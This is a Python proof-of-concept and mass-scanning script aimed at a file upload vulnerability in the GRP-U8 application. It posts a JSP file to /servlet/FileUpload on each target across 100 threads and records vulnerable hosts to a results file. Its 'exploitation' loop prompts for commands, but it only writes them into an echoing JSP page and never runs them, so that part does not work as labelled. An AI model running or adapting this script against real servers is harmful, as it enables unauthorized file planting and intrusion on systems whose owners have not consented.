import requests,argparse,sys,time,re
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """" 
 ██████╗ ██████╗ ██████╗       ██╗   ██╗ █████╗     ███████╗██╗██╗     ███████╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔════╝ ██╔══██╗██╔══██╗      ██║   ██║██╔══██╗    ██╔════╝██║██║     ██╔════╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
██║  ███╗██████╔╝██████╔╝█████╗██║   ██║╚█████╔╝    █████╗  ██║██║     █████╗  ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██║   ██║██╔══██╗██╔═══╝ ╚════╝██║   ██║██╔══██╗    ██╔══╝  ██║██║     ██╔══╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
╚██████╔╝██║  ██║██║           ╚██████╔╝╚█████╔╝    ██║     ██║███████╗███████╗╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝            ╚═════╝  ╚════╝     ╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                                                                                                      
                                                                                                                 version:1.0
    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='GRP-U8 FileUpload! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    #构造的POC
    payload_url = '/servlet/FileUpload?fileName=ccsxxzjx.jsp&actionID=update'
    url = target+payload_url
    url1 = target+'/R9iPortal/upload/ccsxxzjx.jsp'
    headers = {
		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
        'Content-Length': '41',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection': 'close'
	}
    data = '<% out.println("frijcdiyuaqkgwvodnks");%>'
    try:
        res = requests.post(url,headers=headers,data=data,verify=False,timeout=5)
        res1 = requests.post(url1,headers=headers,data=data,verify=False,timeout=5)
        if res.status_code == 200 and 'frijcdiyuaqkgwvodnks' in res1.text:
            print(f"[+]该url存在漏洞{target}")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
                return True
        else:
            print(f"[-]该url不存在漏洞{target}")
            return False
    except Exception as e:
        print(f"[*]该url存在问题{target}"+e)
        return False
def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        cmd = input('请输入你要执行的命令(输入q退出): ')
        if cmd == 'q':
            print('bye')
            break
        payload_url = '/servlet/FileUpload?fileName=ccsxxzjx.jsp&actionID=update'
        url = target+payload_url
        headers = {
		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
        'Content-Length': '41',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection': 'close'
	}
        data = f'<% out.println("{cmd}");%>'
        res = requests.post(url,headers=headers,data=data,verify=False,timeout=5)
        # 用户输入任意字符串，拼接到url1后发送请求
        url1 = target + '/R9iPortal/upload/ccsxxzjx.jsp'
        res1 = requests.post(url1, headers=headers, data=data, verify=False, timeout=5)
        if res.status_code == 200 and cmd in res1.text:
            print(res1.text)
        
if __name__ == '__main__':
    main()